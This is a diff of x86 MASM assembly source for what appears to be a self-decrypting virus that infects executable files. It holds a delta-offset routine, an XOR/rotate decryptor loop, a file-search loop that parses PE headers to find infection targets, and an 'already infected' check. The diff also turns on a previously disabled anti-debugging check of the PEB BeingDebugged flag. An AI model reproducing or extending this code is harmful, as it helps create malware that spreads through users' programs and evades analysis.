@@ -18,24 +18,25 @@ option casemap:none
       includelib \masm32\lib\kernel32.lib
 
 .code
-; Encryption
+; Decryption
 start_of_code:
 	call decryptor_get_eip
 	decryptor_get_eip:
-		pop ebx
-	sub ebx, 5
+		pop edx
+	sub edx, 5
+	push edx ; save it
+	lea esi, [edx + (data - start_of_code)]
 	; check for debugger
 	ASSUME FS:NOTHING
 	mov edx, fs:[30h]
 	ASSUME FS:ERROR
-	cmp (PEB PTR [edx]).BeingDebugged, 0
-	; disable it for now
-;	jne end_of_code
 
-	lea esi, [ebx + (data - start_of_code)]
-	xor ecx, ecx
+	cmp (PEB PTR [edx]).BeingDebugged, 0
+	jne end_of_code
+
 	cypt_key:
 	mov edx, 00000000h
+	xor ecx, ecx
 	decryptor_loop_b:
 		cmp ecx, (end_of_code - data)
 		je decryptor_loop_e
@@ -46,7 +47,9 @@ start_of_code:
 		ror edx, cl
 		jmp decryptor_loop_b
 	decryptor_loop_e:
-	lea eax, [ebx + (start - start_of_code)]
+	pop eax ; start_of_code address
+	mov ebp, esp ; reset ebp
+	lea eax, [eax + (start - start_of_code)]
 	jmp eax
 
 
@@ -71,6 +74,7 @@ data:
 	PopUpMessage            BYTE "EEaahh!",0
 	GetTickCount_str		BYTE "GetTickCount",0
 	returnAddr              DWORD 000000000h
+
 
 ; ret : function address
 ; arg1: function name
@@ -432,7 +436,7 @@ loop_find_file:
 	mov (STACK_STORAGE PTR [esp]).filePeHeader, edi
 	mov (STACK_STORAGE PTR [esp]).fileLastSectionHeader, edx
 
-	; check if infector or already infected
+	; check if itself
 	mov eax, ebx
 	add eax, (start - data)
 	; get physical entry point address
